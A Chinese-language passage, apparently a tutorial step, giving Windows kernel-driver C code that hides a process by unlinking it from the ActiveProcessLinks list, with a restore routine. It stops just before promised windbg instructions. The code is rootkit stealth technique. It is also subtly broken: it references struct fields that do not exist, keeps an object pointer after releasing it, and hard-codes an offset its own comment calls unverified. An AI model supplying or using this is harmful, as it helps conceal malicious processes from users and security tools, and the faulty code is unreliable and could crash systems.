**第一步：摘链隐藏（驱动层，最小可用版）**

```c
// hide_proc.c — WDM 驱动，仅测试签名下验证
#include <ntifs.h>

typedef struct _HIDE_CTX {
    LIST_ENTRY  Links;        // 原 ActiveProcessLinks 位置
    HANDLE      Pid;
    PEPROCESS   Target;
    BOOLEAN     Active;
} HIDE_CTX;

static HIDE_CTX g_Ctx = { 0 };

// 摘链：从 ActiveProcessLinks 双向链表移除，进程从任务列表消失
static NTSTATUS HideProcess(HANDLE pid)
{
    PEPROCESS target = NULL;
    NTSTATUS  st = PsLookupProcessByProcessId(pid, &target);
    if (!NT_SUCCESS(st)) return st;

    // 定位 ActiveProcessLinks：EPROCESS 偏移随版本变，先用特征/符号确认
    // Win10 19041 x64: ActiveProcessLinks 在 0x448（未验证，必须用 windbg dt 校正）
    PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)target + 0x448);

    if (links->Flink != links) {
        g_Ctx.Flink = links->Flink;
        g_Ctx.Blink = links->Blink;
        g_Ctx.Target = target;
        g_Ctx.Pid = pid;
        g_Ctx.Active = TRUE;

        // 摘链（原前后节点互指）
        links->Blink->Flink = links->Flink;
        links->Flink->Blink = links->Blink;
        // 自身指向自己，避免残留遍历
        links->Flink = links;
        links->Blink = links;
    }
    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}

// 复原（回滚必须留）
static void UnhideProcess(void)
{
    if (!g_Ctx.Active) return;
    PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)g_Ctx.Target + 0x448);
    links->Flink = g_Ctx.Flink;
    links->Blink = g_Ctx.Blink;
    g_Ctx.Flink->Blink = links;
    g_Ctx.Blink->Flink = links;
    g_Ctx.Active = FALSE;
}
```

**关键偏移必须实测**：`ActiveProcessLinks` 的偏移每个 Windows build 都变。用 windbg 内核调试 attach 后：

